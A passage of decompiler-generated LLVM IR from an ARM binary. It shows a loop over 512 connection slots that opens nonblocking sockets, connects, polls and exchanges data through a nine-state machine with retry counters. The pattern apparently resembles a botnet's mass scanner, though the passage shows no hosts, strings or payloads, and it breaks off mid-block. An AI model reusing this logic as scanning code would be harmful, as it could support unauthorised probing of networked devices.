  %stack_var_-340 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_e958 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e958, i32* %ip.global-to-local, align 4
  %v3_e95c = load i32, i32* @r4, align 4
  store i32 %v3_e95c, i32* %stack_var_-24, align 4
  store i32 59748, i32* %stack_var_-4, align 4
  %v2_e960 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e960, i32* @fp, align 4
  %v2_e97c = call i32 @function_1265c(i32* null)
  store i32 %v2_e97c, i32* @r4, align 4
  %v0_e988 = call i32 @function_83f0()
  %v0_e990 = load i32, i32* @r4, align 4
  %v2_e990 = xor i32 %v0_e990, %v0_e988
  %v1_e998 = call i32 @function_15e28(i32 %v2_e990)
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_e9b4 = call i32 @function_1464c(i32 23)
  store i32 8, i32* @r2, align 4
  %v2_e9e4 = bitcast i32* %stack_var_-604 to i8*
  %v3_e9e4 = call i32 @function_13ed0(i8* %v2_e9e4, i32 0)
  %v1_e9f0 = call i32 @function_14ccc(i32 513)
  store i32 513, i32* @r2, align 4
  %v2_ea0c = inttoptr i32 %v1_e9f0 to i8*
  %v3_ea0c = call i32 @function_13ed0(i8* %v2_ea0c, i32 0)
  %v1_ea30 = load i32, i32* @sp, align 4
  %v1_ea40 = add i32 %v1_ea30, -14329
  %v3_ea44 = and i32 %v1_ea40, -8
  store i32 2560, i32* @r2, align 4
  %v2_ea78 = inttoptr i32 %v3_ea44 to i8*
  %v3_ea78 = call i32 @function_13ed0(i8* %v2_ea78, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ea88

dec_label_pc_ea88:                                ; preds = %dec_label_pc_e958, %dec_label_pc_ea88
  %storemerge413 = phi i32 [ 0, %dec_label_pc_e958 ], [ %v1_eb04, %dec_label_pc_ea88 ]
  %v2_ea98 = mul nuw nsw i32 %storemerge413, 28
  %v2_ea9c = add i32 %v2_ea98, %v3_ea44
  store i32 28, i32* @r2, align 4
  %v2_eaac = inttoptr i32 %v2_ea9c to i8*
  %v3_eaac = call i32 @function_13ed0(i8* %v2_eaac, i32 0)
  %v3_ead4 = add i32 %v2_ea9c, 9
  %v4_ead4 = inttoptr i32 %v3_ead4 to i8*
  store i8 1, i8* %v4_ead4, align 1
  %v2_eaf4 = add i32 %v2_ea9c, 24
  %v2_eafc = inttoptr i32 %v2_eaf4 to i32*
  store i32 %v1_e9f0, i32* %v2_eafc, align 4
  %v1_eb04 = add nuw nsw i32 %storemerge413, 1
  store i32 %v1_eb04, i32* %r2.global-to-local, align 4
  %v5_eb18 = icmp slt i32 %v1_eb04, 512
  br i1 %v5_eb18, label %dec_label_pc_ea88, label %dec_label_pc_eb1c.preheader

dec_label_pc_eb1c.preheader:                      ; preds = %dec_label_pc_ea88
  %v19_e95c = ptrtoint i32* %stack_var_-24 to i32
  %v2_eba4 = add i32 %v3_ea44, 8
  %v2_eea8 = or i32 %v3_ea44, 4
  %v2_ef88 = ptrtoint i32* %stack_var_-612 to i32
  %v2_f060 = ptrtoint i32* %stack_var_-328 to i32
  %v2_f160 = ptrtoint i32* %stack_var_-336 to i32
  %v2_f1bc = ptrtoint i32* %stack_var_-200 to i32
  %v2_f1c0 = ptrtoint i32* %stack_var_-340 to i32
  %v2_f328 = add i32 %v3_ea44, 24
  %v2_fd14 = add i32 %v3_ea44, 16
  br label %dec_label_pc_eb1c

dec_label_pc_eb1c:                                ; preds = %dec_label_pc_fff0, %dec_label_pc_eb1c.preheader
  br label %dec_label_pc_eb28

dec_label_pc_eb28:                                ; preds = %dec_label_pc_eb1c, %dec_label_pc_fff0
  %storemerge511 = phi i32 [ 0, %dec_label_pc_eb1c ], [ %v1_fff4, %dec_label_pc_fff0 ]
  %v3_eb34 = mul i32 %storemerge511, 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_eb3c = mul nuw nsw i32 %storemerge511, 28
  %v2_eb40 = add i32 %v2_eb3c, %v3_ea44
  %v2_eb44 = add i32 %v2_eb40, 16
  %v1_eb48 = inttoptr i32 %v2_eb44 to i32*
  %v2_eb48 = load i32, i32* %v1_eb48, align 4
  %v2_eb4c = icmp eq i32 %v2_eb48, 0
  br i1 %v2_eb4c, label %dec_label_pc_eb54, label %dec_label_pc_eb8c

dec_label_pc_eb54:                                ; preds = %dec_label_pc_eb28
  store i32 %storemerge511, i32* @r4, align 4
  %v2_eb5c = call i32 @function_1265c(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_eb70 = load i32, i32* @r4, align 4
  %v3_eb74 = mul i32 %v0_eb70, 4
  store i32 %v3_eb74, i32* %r2.global-to-local, align 4
  %v2_eb7c = mul i32 %v0_eb70, 28
  %v2_eb84 = add i32 %v2_fd14, %v2_eb7c
  %v2_eb88 = inttoptr i32 %v2_eb84 to i32*
  store i32 %v2_eb5c, i32* %v2_eb88, align 4
  br label %dec_label_pc_eb8c

dec_label_pc_eb8c:                                ; preds = %dec_label_pc_eb28, %dec_label_pc_eb54
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_eba8 = add i32 %v2_eba4, %v2_eb3c
  %v1_ebac = inttoptr i32 %v2_eba8 to i8*
  %v2_ebac = load i8, i8* %v1_ebac, align 4
  %v3_ebac = sext i8 %v2_ebac to i32
  switch i32 %v3_ebac, label %dec_label_pc_fff0 [
    i32 0, label %dec_label_pc_ebe0
    i32 1, label %dec_label_pc_f074.lr.ph
    i32 2, label %dec_label_pc_f4a8
    i32 3, label %dec_label_pc_f630
    i32 4, label %dec_label_pc_f7e8
    i32 5, label %dec_label_pc_f970
    i32 6, label %dec_label_pc_fb28
    i32 7, label %dec_label_pc_fd8c
    i32 8, label %dec_label_pc_fe4c
  ]

dec_label_pc_ebe0:                                ; preds = %dec_label_pc_eb8c
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_ebfc = add i32 %v2_eb40, 8
  %v1_ec00 = add i32 %v2_eb40, 9
  %v2_ec00 = inttoptr i32 %v1_ec00 to i8*
  %v3_ec00 = load i8, i8* %v2_ec00, align 1
  %v7_ec04 = icmp eq i8 %v3_ec00, 1
  br i1 %v7_ec04, label %dec_label_pc_ec0c, label %dec_label_pc_ecb8

dec_label_pc_ec0c:                                ; preds = %dec_label_pc_ebe0
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_ec28 = add i32 %v2_eb40, 24
  %v1_ec2c = inttoptr i32 %v2_ec28 to i32*
  %v2_ec2c = load i32, i32* %v1_ec2c, align 4
  store i32 28, i32* @r2, align 4
  %v2_ec58 = inttoptr i32 %v2_eb40 to i8*
  %v3_ec58 = call i32 @function_13ed0(i8* %v2_ec58, i32 0)
  store i32 %v2_ec28, i32* %r2.global-to-local, align 4
  store i32 %v2_ec2c, i32* %v1_ec2c, align 4
  store i32 %storemerge511, i32* @r4, align 4
  %v4_ec88 = call i32 @function_ad54(i32 24, i32 %v3_ea44, i32 %v2_ec28, i32 %v2_ec2c)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_ec98 = load i32, i32* @r4, align 4
  %v3_ec9c = mul i32 %v0_ec98, 4
  store i32 %v3_ec9c, i32* %r2.global-to-local, align 4
  %v2_eca4 = mul i32 %v0_ec98, 28
  %v2_ecac = add i32 %v2_eea8, %v2_eca4
  %v2_ecb0 = inttoptr i32 %v2_ecac to i32*
  store i32 %v4_ec88, i32* %v2_ecb0, align 4
  br label %dec_label_pc_ee44

dec_label_pc_ecb8:                                ; preds = %dec_label_pc_ebe0
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v3_ecd8 = load i8, i8* %v2_ec00, align 1
  %v2_ecdc = icmp eq i8 %v3_ecd8, 0
  br i1 %v2_ecdc, label %dec_label_pc_ece4, label %dec_label_pc_ee44

dec_label_pc_ece4:                                ; preds = %dec_label_pc_ecb8
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_ed08 = add i32 %v2_eb40, 11
  %v2_ed08 = inttoptr i32 %v1_ed08 to i8*
  %v3_ed08 = load i8, i8* %v2_ed08, align 1
  %v1_ed0c = add i8 %v3_ed08, 1
  store i8 %v1_ed0c, i8* %v2_ed08, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_ed60 = add i32 %v2_eb40, 10
  %v2_ed60 = inttoptr i32 %v1_ed60 to i8*
  %v3_ed60 = load i8, i8* %v2_ed60, align 2
  %v1_ed64 = add i8 %v3_ed60, 1
  store i32 %v3_ea44, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_ed64, i8* %v2_ed60, align 2
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v3_edb4 = load i8, i8* %v2_ed08, align 1
  %v7_edb8 = icmp eq i8 %v3_edb4, 14
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  br i1 %v7_edb8, label %dec_label_pc_edc0, label %dec_label_pc_edec

dec_label_pc_edc0:                                ; preds = %dec_label_pc_ece4
  store i32 %v2_ebfc, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_ec00, align 1
  br label %dec_label_pc_fff0

dec_label_pc_edec:                                ; preds = %dec_label_pc_ece4
  %v3_ee0c = load i8, i8* %v2_ed60, align 2
  %v7_ee10 = icmp eq i8 %v3_ee0c, 14
  br i1 %v7_ee10, label %dec_label_pc_ee18, label %dec_label_pc_ee44

dec_label_pc_ee18:                                ; preds = %dec_label_pc_edec
  store i32 %v2_ebfc, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_ec00, align 1
  br label %dec_label_pc_fff0

dec_label_pc_ee44:                                ; preds = %dec_label_pc_edec, %dec_label_pc_ecb8, %dec_label_pc_ec0c
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_ee5c = call i32 @function_1464c(i32 23)
  store i32 8, i32* @r2, align 4
  %v3_ee8c = call i32 @function_13ed0(i8* %v2_e9e4, i32 0)
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  store i32 %storemerge511, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_eec8 = call i32 @function_14a84(i32 2, i32 1, i32 0)
  %v0_eed0 = load i32, i32* @r4, align 4
  %v2_eedc = mul i32 %v0_eed0, 28
  %v2_eee0 = add i32 %v2_eedc, %v3_ea44
  %v2_eee4 = inttoptr i32 %v2_eee0 to i32*
  store i32 %v3_eec8, i32* %v2_eee4, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_ef00 = inttoptr i32 %v2_eb40 to i32*
  %v2_ef00 = load i32, i32* %v1_ef00, align 4
  %v7_ef04 = icmp eq i32 %v2_ef00, -1
  br i1 %v7_ef04, label %dec_label_pc_fff0, label %dec_label_pc_ef0c

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_ee44
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_ef24 = load i32, i32* %v1_ef00, align 4
  store i32 %v2_ef24, i32* @r4, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_ef40 = load i32, i32* %v1_ef00, align 4
  store i32 %v2_ef40, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ef50 = call i32 @function_128a0(i32 %v2_ef40, i32 3)
  %v1_ef58 = or i32 %v2_ef50, 2048
  store i32 %v1_ef58, i32* @r3, align 4
  %v0_ef5c = load i32, i32* @r4, align 4
  store i32 %v1_ef58, i32* %r2.global-to-local, align 4
  %v2_ef68 = call i32 @function_128a0(i32 %v0_ef5c, i32 4)
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_ef84 = load i32, i32* %v1_ef00, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_ef98 = call i32 @function_148dc(i32 %v2_ef84, i32 %v2_ef88, i32 16)
  %v3_efa0 = icmp eq i32 %v3_ef98, -1
  br i1 %v3_efa0, label %dec_label_pc_efa8, label %dec_label_pc_f00c

dec_label_pc_efa8:                                ; preds = %dec_label_pc_ef0c
  %v0_efa8 = call i32 @function_12b24()
  %v1_efb0 = inttoptr i32 %v0_efa8 to i32*
  %v2_efb0 = load i32, i32* %v1_efb0, align 4
  %v7_efb4 = icmp eq i32 %v2_efb0, 115
  br i1 %v7_efb4, label %dec_label_pc_f00c, label %dec_label_pc_efbc

dec_label_pc_efbc:                                ; preds = %dec_label_pc_efa8
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_efd4 = load i32, i32* %v1_ef00, align 4
  %v3_efdc = call i32 @function_e908(i32 %v2_efd4, i32 %v3_ea44, i32 %v3_eb34)
  store i32 %v2_ebfc, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_ec00, align 1
  br label %dec_label_pc_fff0

dec_label_pc_f00c:                                ; preds = %dec_label_pc_ef0c, %dec_label_pc_efa8
  %v3_f030 = inttoptr i32 %v2_ebfc to i8*
  store i8 1, i8* %v3_f030, align 4
  store i32 %v2_eb44, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v1_eb48, align 4
  br label %dec_label_pc_fff0

dec_label_pc_f074.lr.ph:                          ; preds = %dec_label_pc_eb8c
  br label %dec_label_pc_f074

dec_label_pc_f074:                                ; preds = %dec_label_pc_f074.lr.ph, %dec_label_pc_f074
  %storemerge610 = phi i32 [ 0, %dec_label_pc_f074.lr.ph ], [ %v1_f088, %dec_label_pc_f074 ]
  store i32 %v2_f060, i32* %r2.global-to-local, align 4
  %v5_f080 = mul nuw nsw i32 %storemerge610, 4
  %v6_f080 = add i32 %v5_f080, %v2_f060
  %v7_f080 = inttoptr i32 %v6_f080 to i32*
  store i32 0, i32* %v7_f080, align 4
  %v1_f088 = add nuw nsw i32 %storemerge610, 1
  %tmp41 = icmp ult i32 %v1_f088, 32
  br i1 %tmp41, label %dec_label_pc_f074, label %dec_label_pc_f09c

dec_label_pc_f09c:                                ; preds = %dec_label_pc_f074
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_f0b4 = inttoptr i32 %v2_eb40 to i32*
  %v2_f0b4 = load i32, i32* %v1_f0b4, align 4
  %v3_f0b8 = udiv i32 %v2_f0b4, 32
  %v3_f0cc = mul nuw nsw i32 %v3_f0b8, 4
  %v2_f0d4 = add i32 %v3_f0cc, %v19_e95c
  store i32 %v2_f0d4, i32* %r2.global-to-local, align 4
  %v2_f0d8 = add i32 %v2_f0d4, -304
  %v1_f0dc = inttoptr i32 %v2_f0d8 to i32*
  %v2_f0dc = load i32, i32* %v1_f0dc, align 4
  store i32 %v2_f0dc, i32* %ip.global-to-local, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f0f8 = load i32, i32* %v1_f0b4, align 4
  %v1_f0fc = urem i32 %v2_f0f8, 32
  %v6_f104 = shl i32 1, %v1_f0fc
  %v2_f108 = or i32 %v6_f104, %v2_f0dc
  store i32 %v2_f108, i32* %v1_f0dc, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f154 = load i32, i32* %v1_f0b4, align 4
  %v1_f158 = add i32 %v2_f154, 1
  store i32 %v1_f158, i32* %r2.global-to-local, align 4
  store i32 %v2_f060, i32* %ip.global-to-local, align 4
  %v1_f164 = load i32, i32* @sp, align 4
  %v2_f164 = inttoptr i32 %v1_f164 to i32*
  store i32 %v2_f160, i32* %v2_f164, align 4
  %v0_f168 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_f060, i32* %r2.global-to-local, align 4
  %v4_f178 = load i32, i32* %stack_var_-336, align 4
  %v5_f178 = call i32 @function_12764(i32 %v0_f168, i32 0, i32 %v2_f060, i32 0, i32 %v4_f178)
  %v7_f188 = icmp eq i32 %v5_f178, 1
  br i1 %v7_f188, label %dec_label_pc_f190, label %dec_label_pc_f370

dec_label_pc_f190:                                ; preds = %dec_label_pc_f09c
  store i32 4, i32* %stack_var_-340, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f1b8 = load i32, i32* %v1_f0b4, align 4
  store i32 %v2_f1b8, i32* %r2.global-to-local, align 4
  store i32 %v2_f1bc, i32* %ip.global-to-local, align 4
  %v1_f1c4 = load i32, i32* @sp, align 4
  %v2_f1c4 = inttoptr i32 %v1_f1c4 to i32*
  store i32 %v2_f1c0, i32* %v2_f1c4, align 4
  %v0_f1c8 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_f1d8 = load i32, i32* %stack_var_-340, align 4
  %v5_f1d8 = call i32 @function_1494c(i32 %v0_f1c8, i32 1, i32 4, i32 %v2_f1bc, i32 %v4_f1d8)
  %v3_f1dc = load i32, i32* %stack_var_-200, align 4
  %v2_f1e0 = icmp eq i32 %v3_f1dc, 0
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f278 = load i32, i32* %v1_f0b4, align 4
  br i1 %v2_f1e0, label %dec_label_pc_f260, label %dec_label_pc_f1e8

dec_label_pc_f1e8:                                ; preds = %dec_label_pc_f190
  %v3_f208 = call i32 @function_e908(i32 %v2_f278, i32 %v3_ea44, i32 %v3_eb34)
  %v2_f228 = add i32 %v2_eb40, 8
  %v3_f230 = inttoptr i32 %v2_f228 to i8*
  store i8 0, i8* %v3_f230, align 4
  store i32 %v2_f228, i32* %r2.global-to-local, align 4
  %v3_f258 = add i32 %v2_eb40, 9
  %v4_f258 = inttoptr i32 %v3_f258 to i8*
  store i8 1, i8* %v4_f258, align 1
  br label %dec_label_pc_fff0

dec_label_pc_f260:                                ; preds = %dec_label_pc_f190
  store i32 %v2_f278, i32* @r4, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f294 = load i32, i32* %v1_f0b4, align 4
  store i32 %v2_f294, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_f2a4 = call i32 @function_128a0(i32 %v2_f294, i32 3)
  %v1_f2ac = and i32 %v2_f2a4, -2049
  store i32 %v1_f2ac, i32* @r3, align 4
  %v0_f2b0 = load i32, i32* @r4, align 4
  store i32 %v1_f2ac, i32* %r2.global-to-local, align 4
  %v2_f2bc = call i32 @function_128a0(i32 %v0_f2b0, i32 4)
  store i32 0, i32* %v1_eb48, align 4
  %v3_f30c = add i32 %v2_eb40, 20
  %v4_f30c = inttoptr i32 %v3_f30c to i16*
  store i16 0, i16* %v4_f30c, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f32c = add i32 %v2_eb3c, %v2_f328
  %v1_f330 = inttoptr i32 %v2_f32c to i32*
  %v2_f330 = load i32, i32* %v1_f330, align 4
  store i32 512, i32* @r2, align 4
  %v2_f340 = inttoptr i32 %v2_f330 to i8*
  %v3_f340 = call i32 @function_13ed0(i8* %v2_f340, i32 0)
  %v2_f360 = add i32 %v2_eb40, 8
  store i32 %v2_f360, i32* %r2.global-to-local, align 4
  %v3_f368 = inttoptr i32 %v2_f360 to i8*
  store i8 2, i8* %v3_f368, align 4
  br label %dec_label_pc_fff0

dec_label_pc_f370:                                ; preds = %dec_label_pc_f09c
  %v3_f374 = icmp eq i32 %v5_f178, -1
  br i1 %v3_f374, label %dec_label_pc_f37c, label %dec_label_pc_f3f4

dec_label_pc_f37c:                                ; preds = %dec_label_pc_f370
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f394 = load i32, i32* %v1_f0b4, align 4
  %v3_f39c = call i32 @function_e908(i32 %v2_f394, i32 %v3_ea44, i32 %v3_eb34)
  %v2_f3bc = add i32 %v2_eb40, 8
  %v3_f3c4 = inttoptr i32 %v2_f3bc to i8*
  store i8 0, i8* %v3_f3c4, align 4
  store i32 %v2_f3bc, i32* %r2.global-to-local, align 4
  %v3_f3ec = add i32 %v2_eb40, 9
  %v4_f3ec = inttoptr i32 %v3_f3ec to i8*
  store i8 1, i8* %v4_f3ec, align 1
  br label %dec_label_pc_fff0

dec_label_pc_f3f4:                                ; preds = %dec_label_pc_f370
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f414 = load i32, i32* %v1_eb48, align 4
  %v1_f418 = add i32 %v2_f414, 6
  store i32 %v1_f418, i32* @r4, align 4
  %v2_f420 = call i32 @function_1265c(i32* null)
  %v0_f428 = load i32, i32* @r4, align 4
  %v3_f428 = icmp ult i32 %v0_f428, %v2_f420
  br i1 %v3_f428, label %dec_label_pc_f430, label %dec_label_pc_fff0

dec_label_pc_f430:                                ; preds = %dec_label_pc_f3f4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f448 = load i32, i32* %v1_f0b4, align 4
  %v3_f450 = call i32 @function_e908(i32 %v2_f448, i32 %v3_ea44, i32 %v3_eb34)
  %v2_f470 = add i32 %v2_eb40, 8
  %v3_f478 = inttoptr i32 %v2_f470 to i8*
  store i8 0, i8* %v3_f478, align 4
  store i32 %v2_f470, i32* %r2.global-to-local, align 4
  %v3_f4a0 = add i32 %v2_eb40, 9
  %v4_f4a0 = inttoptr i32 %v3_f4a0 to i8*
  store i8 1, i8* %v4_f4a0, align 1
  br label %dec_label_pc_fff0

dec_label_pc_f4a8:                                ; preds = %dec_label_pc_eb8c
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_f4c0 = inttoptr i32 %v2_eb40 to i32*
  %v2_f4c0 = load i32, i32* %v1_f4c0, align 4
  store i32 %v2_f4c0, i32* %ip.global-to-local, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f4e0 = add i32 %v2_eb3c, %v2_f328
  %v1_f4e4 = inttoptr i32 %v2_f4e0 to i32*
  %v2_f4e4 = load i32, i32* %v1_f4e4, align 4
  store i32 %v2_f4e4, i32* %r2.global-to-local, align 4
  %v1_f4ec = load i32, i32* @sp, align 4
  %v2_f4ec = inttoptr i32 %v1_f4ec to i32*
  store i32 180456, i32* %v2_f4ec, align 4
  %v0_f4f0 = load i32, i32* %ip.global-to-local, align 4
  %v4_f500 = inttoptr i32 %v2_f4e4 to i8*
  %v5_f500 = call i32 @function_8810(i32 %v0_f4f0, i32 10000, i8* %v4_f500, i32 512)
  %v2_f508 = icmp eq i32 %v5_f500, 0
  br i1 %v2_f508, label %dec_label_pc_f5a0, label %dec_label_pc_f510

dec_label_pc_f510:                                ; preds = %dec_label_pc_f4a8
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f52c = add i32 %v2_eb40, 24
  %v1_f530 = inttoptr i32 %v2_f52c to i32*
  %v2_f530 = load i32, i32* %v1_f530, align 4
  %v1_f538 = call i32 @function_8648(i32 %v2_f530)
  %v2_f540 = icmp eq i32 %v1_f538, 0
  %v2_f590 = add i32 %v2_eb40, 8
  store i32 %v2_f590, i32* %r2.global-to-local, align 4
  br i1 %v2_f540, label %dec_label_pc_f574, label %dec_label_pc_f548

dec_label_pc_f548:                                ; preds = %dec_label_pc_f510
  %v3_f56c = inttoptr i32 %v2_f590 to i8*
  store i8 0, i8* %v3_f56c, align 4
  br label %dec_label_pc_fff0

dec_label_pc_f574:                                ; preds = %dec_label_pc_f510
  %v3_f598 = inttoptr i32 %v2_f590 to i8*
  store i8 3, i8* %v3_f598, align 4
  br label %dec_label_pc_fff0

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f4a8
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f5c0 = load i32, i32* %v1_eb48, align 4
  %v1_f5c4 = add i32 %v2_f5c0, 6
  store i32 %v1_f5c4, i32* @r4, align 4
  %v2_f5cc = call i32 @function_1265c(i32* null)
  %v0_f5d4 = load i32, i32* @r4, align 4
  %v3_f5d4 = icmp ult i32 %v0_f5d4, %v2_f5cc
  br i1 %v3_f5d4, label %dec_label_pc_f5dc, label %dec_label_pc_fff0

dec_label_pc_f5dc:                                ; preds = %dec_label_pc_f5a0
  %v2_f5f8 = add i32 %v2_eb40, 8
  %v3_f600 = inttoptr i32 %v2_f5f8 to i8*
  store i8 0, i8* %v3_f600, align 4
  store i32 %v2_f5f8, i32* %r2.global-to-local, align 4
  %v3_f628 = add i32 %v2_eb40, 9
  %v4_f628 = inttoptr i32 %v3_f628 to i8*
  store i8 1, i8* %v4_f628, align 1
  br label %dec_label_pc_fff0

dec_label_pc_f630:                                ; preds = %dec_label_pc_eb8c
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_f648 = inttoptr i32 %v2_eb40 to i32*
  %v2_f648 = load i32, i32* %v1_f648, align 4
  store i32 %v2_f648, i32* @r4, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f668 = add i32 %v2_eb40, 8
  %v1_f66c = add i32 %v2_eb40, 10
  %v2_f66c = inttoptr i32 %v1_f66c to i8*
  %v3_f66c = load i8, i8* %v2_f66c, align 2
  %v4_f66c = zext i8 %v3_f66c to i32
  store i32 %v4_f66c, i32* %r2.global-to-local, align 4
  %v4_f678 = mul nuw nsw i32 %v4_f66c, 4
  %v5_f678 = add nuw nsw i32 %v4_f678, 180584
  %v6_f678 = inttoptr i32 %v5_f678 to i32*
  %v7_f678 = load i32, i32* %v6_f678, align 4
  store i32 %v7_f678, i32* @r5, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v3_f69c = load i8, i8* %v2_f66c, align 2
  %v4_f69c = zext i8 %v3_f69c to i32
  store i32 %v4_f69c, i32* %r2.global-to-local, align 4
  %v4_f6a8 = mul nuw nsw i32 %v4_f69c, 4
  %v5_f6a8 = add nuw nsw i32 %v4_f6a8, 180584
  %v6_f6a8 = inttoptr i32 %v5_f6a8 to i32*
  %v7_f6a8 = load i32, i32* %v6_f6a8, align 4
  store i32 %v7_f6a8, i32* @r0, align 4
  %v0_f6b0 = call i32 @function_13f70()
  %v0_f6b8 = load i32, i32* @r4, align 4
  %v0_f6bc = load i32, i32* @r5, align 4
  store i32 %v0_f6b0, i32* %r2.global-to-local, align 4
  %v4_f6c8 = call i32 @function_149c8(i32 %v0_f6b8, i32 %v0_f6bc, i32 %v0_f6b0, i32 16384)
  %v1_f6d0 = icmp slt i32 %v4_f6c8, 0
  br i1 %v1_f6d0, label %dec_label_pc_f6d8, label %dec_label_pc_f72c

dec_label_pc_f6d8:                                ; preds = %dec_label_pc_f630
  %v3_f6fc = inttoptr i32 %v2_f668 to i8*
  store i8 0, i8* %v3_f6fc, align 4
  store i32 %v2_f668, i32* %r2.global-to-local, align 4
  %v3_f724 = add i32 %v2_eb40, 9
  %v4_f724 = inttoptr i32 %v3_f724 to i8*
  store i8 1, i8* %v4_f724, align 1
  br label %dec_label_pc_fff0

dec_label_pc_f72c:                                ; preds = %dec_label_pc_f630
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f744 = load i32, i32* %v1_f648, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_f758 = call i32 @function_149c8(i32 %v2_f744, i32 ptrtoint ([3 x i8]* @global_var_221fc.558 to i32), i32 2, i32 16384)
  %v1_f760 = icmp slt i32 %v5_f758, 0
  store i32 %v2_f668, i32* %r2.global-to-local, align 4
  br i1 %v1_f760, label %dec_label_pc_f768, label %dec_label_pc_f7bc

dec_label_pc_f768:                                ; preds = %dec_label_pc_f72c
  %v3_f78c = inttoptr i32 %v2_f668 to i8*
  store i8 0, i8* %v3_f78c, align 4
  store i32 %v2_f668, i32* %r2.global-to-local, align 4
  %v3_f7b4 = add i32 %v2_eb40, 9
  %v4_f7b4 = inttoptr i32 %v3_f7b4 to i8*
  store i8 1, i8* %v4_f7b4, align 1
  br label %dec_label_pc_fff0

dec_label_pc_f7bc:                                ; preds = %dec_label_pc_f72c
  %v3_f7e0 = inttoptr i32 %v2_f668 to i8*
  store i8 4, i8* %v3_f7e0, align 4
  br label %dec_label_pc_fff0

dec_label_pc_f7e8:                                ; preds = %dec_label_pc_eb8c
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_f800 = inttoptr i32 %v2_eb40 to i32*
  %v2_f800 = load i32, i32* %v1_f800, align 4
  store i32 %v2_f800, i32* %ip.global-to-local, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f820 = add i32 %v2_eb3c, %v2_f328
  %v1_f824 = inttoptr i32 %v2_f820 to i32*
  %v2_f824 = load i32, i32* %v1_f824, align 4
  store i32 %v2_f824, i32* %r2.global-to-local, align 4
  %v1_f82c = load i32, i32* @sp, align 4
  %v2_f82c = inttoptr i32 %v1_f82c to i32*
  store i32 180456, i32* %v2_f82c, align 4
  %v0_f830 = load i32, i32* %ip.global-to-local, align 4
  %v4_f840 = inttoptr i32 %v2_f824 to i8*
  %v5_f840 = call i32 @function_8810(i32 %v0_f830, i32 10000, i8* %v4_f840, i32 512)
  %v2_f848 = icmp eq i32 %v5_f840, 0
  br i1 %v2_f848, label %dec_label_pc_f8e0, label %dec_label_pc_f850

dec_label_pc_f850:                                ; preds = %dec_label_pc_f7e8
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f86c = add i32 %v2_eb40, 24
  %v1_f870 = inttoptr i32 %v2_f86c to i32*
  %v2_f870 = load i32, i32* %v1_f870, align 4
